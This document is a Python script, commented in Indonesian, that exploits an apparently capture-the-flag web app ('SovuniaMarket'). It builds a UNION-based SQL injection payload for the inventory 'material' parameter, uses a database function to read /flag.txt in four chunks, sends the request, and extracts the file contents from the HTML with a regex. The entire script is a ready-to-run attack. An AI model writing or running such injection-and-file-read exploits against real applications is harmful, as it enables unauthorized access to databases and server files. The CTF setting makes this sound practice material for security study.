import urllib.request
import urllib.parse
import re

print("""
================================================
  SovuniaMarket SQLi LFI Exploit
  Target: tasks.4x10m.ru:20968
================================================
""")

# URL Endpoint yang rentan
base_url = "http://tasks.4x10m.ru:20968/inventory?material="

# Payload SQL Injection (UNION Based LFI via custom blob_get function)
# Kita memecah output blob_get('/flag.txt') ke 4 kolom berbeda (15 karakter per kolom)
# untuk mem-bypass limitasi karakter/pemotongan dari frontend.
payload = (
    "x' UNION ALL SELECT 7, "
    "SUBSTR(blob_get('/flag.txt'),1,15), "
    "SUBSTR(blob_get('/flag.txt'),16,15), "
    "SUBSTR(blob_get('/flag.txt'),31,15), "
    "SUBSTR(blob_get('/flag.txt'),46,25), "
    "6990, 50-- -"
)

print("[*] Merakit payload jahat...")
# Encode payload agar aman dikirim via URL
encoded_payload = urllib.parse.quote(payload)
full_url = base_url + encoded_payload

print(f"[*] Menembak target: /inventory?material=x' UNION ALL...\n")

try:
    # Mengirim request HTTP GET
    req = urllib.request.Request(full_url)
    response = urllib.request.urlopen(req).read().decode('utf-8')

    # Mengekstrak kepingan mosaik dari HTML menggunakan Regex
    # Kita mencari baris <tr> yang diawali dengan <td class="mono">7</td> (ID palsu kita)
    pattern = r'<td class="mono">7</td>\s*<td>(.*?)</td>\s*<td class="mono">(.*?)</td>\s*<td>(.*?)</td>\s*<td class="mono">(.*?)</td>'
    match = re.search(pattern, response, re.DOTALL | re.IGNORECASE)

    if match:
        part1 = match.group(1).strip()
        part2 = match.group(2).strip()
        part3 = match.group(3).strip()
        
        # Bersihkan part 4 dari sisa tag HTML (berjaga-jaga jika ada </td> nyangkut)
        part4 = re.sub(r'<[^>]+>', '', match.group(4)).strip()

        print("[+] Baris injeksi berhasil ditemukan!")
        print(f"    ├─ Potongan 1: {part1}")
        print(f"    ├─ Potongan 2: {part2}")
        print(f"    ├─ Potongan 3: {part3}")
        print(f"    └─ Potongan 4: {part4}")

        # Gabungkan semua potongan
        flag = part1 + part2 + part3 + part4
        
        print("\n" + "="*48)
        print(f" 🏴‍☠️ FLAG: {flag} ")
        print("="*48 + "\n")
    else:
        print("[-] Gagal menemukan data hasil injeksi di response HTML.")
        print("[!] Apakah server di-restart atau URL target berubah?")

except Exception as e:
    print(f"[-] Terjadi kesalahan koneksi: {e}")
